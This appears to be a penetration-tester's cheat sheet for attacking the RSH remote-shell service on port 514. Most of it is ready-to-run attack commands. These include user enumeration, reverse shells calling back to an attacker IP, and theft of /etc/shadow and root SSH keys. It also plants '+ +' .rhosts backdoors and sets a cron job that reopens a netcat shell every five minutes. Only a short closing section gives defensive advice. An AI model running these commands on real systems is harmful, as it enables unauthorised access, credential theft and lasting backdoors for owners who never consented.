# RSH ENUMERATION (Port 514)

## SERVICE OVERVIEW
```
RSH (Remote Shell) is an insecure remote command execution service
- No encryption (all data sent in plain text)
- NO password authentication (relies entirely on .rhosts)
- Most dangerous of the r-services
- Trust-based authentication only
- Replaced by SSH in modern environments
```

## IMPORTANT NOTE
```
Port 514 can be either:
1. RSH (Remote Shell) - TCP
2. Syslog - UDP

Use: nmap -sV -p514 -sT <IP>  (for RSH/TCP)
Use: nmap -sV -p514 -sU <IP>  (for Syslog/UDP)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p514 -sT <IP>                          # TCP scan for RSH
nmap -sV -p514 -sU <IP>                          # UDP scan for Syslog
nc -nv <IP> 514                                  # Manual connection (TCP)
```

## BASIC ENUMERATION
```bash
# Nmap scripts
nmap -p514 -sT -sV <IP>                          # Version detection (TCP)
nmap -p514 -sT --script rsh-* <IP>               # RSH scripts

# Differentiate RSH vs Syslog
nmap -p514 -sT -sV <IP>                          # TCP = likely RSH
nmap -p514 -sU -sV <IP>                          # UDP = likely Syslog
```

## .RHOSTS FILE EXPLOITATION
```bash
# RSH requires .rhosts file for authentication
# NO password prompt - if .rhosts allows you, you're in!

# .rhosts format:
# <hostname> <username>
# Examples:
# + +                  # Trust everyone (CRITICAL!)
# attacker.com root    # Trust root from attacker.com
# 192.168.1.100 +      # Trust any user from this IP

# Test RSH access
rsh <IP> whoami
rsh <IP> id
rsh <IP> -l root whoami
rsh <IP> -l admin id
```

## MANUAL RSH COMMANDS
```bash
# Basic command execution (no password!)
rsh <IP> whoami
rsh <IP> "id && hostname"
rsh <IP> "uname -a"
rsh <IP> "cat /etc/passwd"
rsh <IP> -l root "whoami"                        # As specific user
rsh <IP> -l admin "cat /etc/shadow"

# If successful, you get direct command execution!
```

## USER ENUMERATION
```bash
# Try different users
rsh <IP> -l root whoami
rsh <IP> -l admin whoami
rsh <IP> -l user whoami
rsh <IP> -l oracle whoami
rsh <IP> -l postgres whoami

# Script for enumeration
for user in root admin test user guest oracle; do
    echo "Testing user: $user"
    rsh <IP> -l $user "whoami" 2>/dev/null && echo "[+] User $user has access!"
done
```

## TRAFFIC SNIFFING
```bash
# Capture RSH traffic (all data in plain text)
tcpdump -i eth0 -A 'tcp port 514'
wireshark (filter: tcp.port == 514)

# RSH transmits:
# - Commands in clear text
# - Output in clear text
# - Usernames in clear text
# No passwords (uses .rhosts trust)
```

## COMMAND EXECUTION TECHNIQUES
```bash
# Information gathering
rsh <IP> "whoami && id && hostname"
rsh <IP> "uname -a"
rsh <IP> "cat /etc/passwd"
rsh <IP> "ps aux"
rsh <IP> "netstat -tulpn"
rsh <IP> "ifconfig"
rsh <IP> "route -n"

# Reverse shell
# Set up listener: nc -lvnp 4444
rsh <IP> "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"
rsh <IP> "nc -e /bin/bash <attacker_IP> 4444"
rsh <IP> "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<attacker_IP>\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

# File exfiltration
rsh <IP> "cat /etc/shadow" > shadow.txt
rsh <IP> "cat /root/.ssh/id_rsa" > id_rsa
rsh <IP> "tar czf /tmp/backup.tar.gz /etc /root/.ssh" && scp <IP>:/tmp/backup.tar.gz .
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/rservices/rsh_login        # RSH scanner
set RHOSTS <IP>
run

# Note: RSH doesn't use passwords, so brute forcing doesn't apply
# Access depends entirely on .rhosts configuration
```

## VULNERABILITY SCANNING
```bash
# Known vulnerabilities
searchsploit rsh

# The service itself is a critical vulnerability
nmap -p514 -sT --script vuln <IP>
```

## INTERESTING FILES & CONFIGURATION
```bash
# Configuration files
/etc/xinetd.d/rsh                                # xinetd configuration
/etc/inetd.conf                                  # inetd configuration

# Trust files (CRITICAL!)
~/.rhosts                                        # User's trusted hosts
/root/.rhosts                                    # Root's trusted hosts
/etc/hosts.equiv                                 # System-wide trusted hosts

# Check trust files (after access)
rsh <IP> "cat ~/.rhosts"
rsh <IP> "cat /root/.rhosts"
rsh <IP> "cat /etc/hosts.equiv"
rsh <IP> "find /home -name .rhosts 2>/dev/null"
rsh <IP> "find / -name .rhosts 2>/dev/null"
```

## HOSTS.EQUIV EXPLOITATION
```bash
# Check /etc/hosts.equiv
rsh <IP> "cat /etc/hosts.equiv"

# Dangerous configurations:
# + +                  # Trust EVERYONE from EVERYWHERE (instant root!)
# attacker.com         # Trust all users from attacker.com
# +                    # Trust all hosts
# - user               # Deny specific user (but allow others)

# If "+ +" exists:
rsh <IP> whoami                                  # Likely works without any auth!
rsh <IP> -l root "whoami"                        # Even root access!
```

## CREATING .RHOSTS FOR BACKDOOR
```bash
# If you have write access to a user's home directory:
rsh <IP> "echo '+ +' > ~/.rhosts"                # Trust everyone (VERY dangerous!)
rsh <IP> "chmod 600 ~/.rhosts"                   # Correct permissions
# Now RSH access is open!

# More targeted backdoor:
rsh <IP> "echo '<your_IP> <your_username>' >> ~/.rhosts"
rsh <IP> "chmod 600 ~/.rhosts"
# Now you can access from your IP
```

## COMMON MISCONFIGURATIONS
```
☐ Service enabled at all                        # Should be disabled!
☐ No encryption                                  # Inherent to protocol
☐ No password authentication                     # Only trusts .rhosts
☐ .rhosts with "+ +" wildcard                   # CRITICAL - trust everyone!
☐ Weak .rhosts configuration                    # Trust too many hosts
☐ /etc/hosts.equiv with wildcards               # System-wide trust
☐ Root login allowed                             # Direct root access possible
☐ No IP restrictions                             # Accessible from anywhere
☐ No logging/auditing                            # Attacks go unnoticed
☐ World-writable .rhosts files                  # Anyone can modify trust
```

## QUICK WIN CHECKLIST
```
☐ Test passwordless access (rsh <IP> whoami)
☐ Test as root (rsh <IP> -l root whoami)
☐ Check for "+ +" in .rhosts or hosts.equiv
☐ Test all common usernames
☐ Sniff network traffic for commands/data
☐ Check file permissions on .rhosts files
☐ Look for /etc/hosts.equiv
☐ Test command execution
☐ Search for known vulnerabilities
☐ Check for other r-services (rexec:512, rlogin:513)
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick RSH check
nmap -sV -p514 -sT <IP>

# Test access
rsh <IP> whoami 2>/dev/null && echo "[+] RSH access granted!"

# Test multiple users
for user in root admin test user guest daemon bin sys; do rsh <IP> -l $user "whoami" 2>/dev/null && echo "[+] Access as $user"; done
```

## POST-EXPLOITATION (After successful RSH access)
```bash
# Information gathering
rsh <IP> "whoami && id && hostname"
rsh <IP> "uname -a"
rsh <IP> "cat /etc/passwd"
rsh <IP> "cat /etc/shadow"                       # If accessible
rsh <IP> "ps aux"
rsh <IP> "netstat -tulpn"
rsh <IP> "ss -tulpn"
rsh <IP> "iptables -L"
rsh <IP> "df -h"
rsh <IP> "mount"
rsh <IP> "cat /etc/crontab"
rsh <IP> "ls -la /var/www/html"

# Check trust relationships
rsh <IP> "cat ~/.rhosts"
rsh <IP> "cat /etc/hosts.equiv"
rsh <IP> "find /home -name .rhosts -exec cat {} \;"

# Privilege escalation enumeration
rsh <IP> "sudo -l"
rsh <IP> "find / -perm -4000 2>/dev/null"        # SUID binaries
rsh <IP> "cat /etc/sudoers"
rsh <IP> "getcap -r / 2>/dev/null"               # Capabilities

# Establish persistence
rsh <IP> "echo 'ssh_public_key' >> ~/.ssh/authorized_keys"
rsh <IP> "echo '+ +' >> ~/.rhosts"               # Extreme - opens to everyone!
rsh <IP> "(crontab -l; echo '*/5 * * * * nc <attacker_IP> 4444 -e /bin/bash') | crontab -"

# Download sensitive data
rsh <IP> "cat /etc/shadow" > shadow.txt
rsh <IP> "cat /root/.ssh/id_rsa" > root_key
rsh <IP> "tar czf - /etc /root/.ssh 2>/dev/null" > sensitive.tar.gz

# Lateral movement
rsh <IP> "cat ~/.ssh/known_hosts"
rsh <IP> "cat ~/.bash_history | grep -E 'ssh|rsh|telnet|rlogin'"
rsh <IP> "find /home -name id_rsa 2>/dev/null"
```

## SECURITY IMPLICATIONS
```
CRITICAL VULNERABILITIES:
1. No encryption - all traffic in plain text
2. NO password authentication - only .rhosts
3. Trust-based authentication is easily abused
4. Wildcard trust (+ +) = complete compromise
5. Often allows direct root access
6. Commands executed with full user privileges
7. Minimal to no logging
8. Legacy protocol with no security features
9. Most dangerous of all r-services

ATTACK SCENARIOS:
- If .rhosts exists with wildcards: instant access
- If /etc/hosts.equiv has "+": system-wide access
- If you can write .rhosts: create backdoor
- If RSH enabled: indicates poor security posture

RECOMMENDATION:
- Disable RSH IMMEDIATELY
- Replace with SSH
- If found during pentest, report as CRITICAL FINDING
- Check all systems for .rhosts and hosts.equiv files
- This is worse than having no firewall!
```

## MANUAL PROTOCOL INTERACTION
```bash
# RSH protocol details:
# 1. Client connects to port 514
# 2. Sends: secondary port number (1023-512)
# 3. Sends: client username\0server username\0command\0
# 4. Server checks .rhosts and executes if allowed

# Python script for manual RSH
python3 << 'EOF'
import socket
s = socket.socket()
s.connect(('<IP>', 514))
s.send(b'1023\x00')                # Secondary port
s.send(b'root\x00')                # Client user
s.send(b'root\x00')                # Server user
s.send(b'whoami\x00')              # Command
response = s.recv(4096)
print(response.decode())
s.close()
EOF
```

## R-SERVICES FINAL COMPARISON
```
             | Auth Method      | Password | Port | Encryption
-------------|------------------|----------|------|------------
rexec (512)  | Username/Pass    | Yes      | 512  | No
rlogin (513) | .rhosts or Pass  | Maybe    | 513  | No
rsh (514)    | .rhosts only     | Never    | 514  | No

DANGER LEVEL:
rsh    > rlogin > rexec  (all are critically insecure!)

All r-services:
- Must be disabled
- Replaced with SSH
- Indicate severe security issues if found
- Are trivial to exploit if misconfigured
```
